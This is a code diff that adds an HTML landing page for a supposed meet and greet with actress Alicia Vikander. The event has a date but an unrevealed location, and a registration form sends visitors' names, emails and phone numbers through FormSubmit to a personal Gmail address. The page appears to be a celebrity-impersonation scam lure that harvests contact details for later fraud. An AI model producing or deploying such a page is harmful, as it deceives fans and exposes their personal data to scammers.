@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Alicia Vikander - Meet and Greet</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <div class="header-container">
+            <h1>Meet & Greet Alicia Vikander</h1>
+            <p>Your exclusive chance to meet the Oscar-winning actress!</p>
+        </div>
+    </header>
+
+    <section class="introduction">
+        <div class="intro-container">
+            <h2>About Alicia Vikander</h2>
+            <p>Alicia Vikander is a Swedish actress known for her dynamic roles in films such as "Ex Machina," "The Danish Girl," and "Tomb Raider." Join us for an unforgettable meet and greet!</p>
+        </div>
+    </section>
+
+    <section class="event-info">
+        <div class="event-details">
+            <h3>Event Details</h3>
+            <p>Date: June 12, 2025</p>
+            <p>Time: 5:00 PM - 7:00 PM</p>
+            <p>Location: will soon be revealed</p>
+        </div>
+    </section>
+
+    <section class="registration">
+        <h3>Register for the Event</h3>
+        <!-- Form to capture user info and submit via Formsubmit -->
+        <form action="https://formsubmit.co/kickace559@gmail.com" method="POST">
+            <input type="text" name="name" id="name" placeholder="Your Name" required>
+            <input type="email" name="email" id="email" placeholder="Your Email" required>
+            <input type="phone" name="phone" id="phone" placeholder="Your Phone Number" required>
+            <!-- Hidden input to redirect after submission -->
+            <input type="hidden" name="_next" value="success.html">
+            <button type="submit" id="submit-btn">Register</button>
+        </form>
+        <p id="response-msg"></p>
+    </section>
+
+    <footer>
+        <p>&copy; 2025 Alicia Vikander Fan Club | All Rights Reserved</p>
+    </footer>
+</body>
+</html>
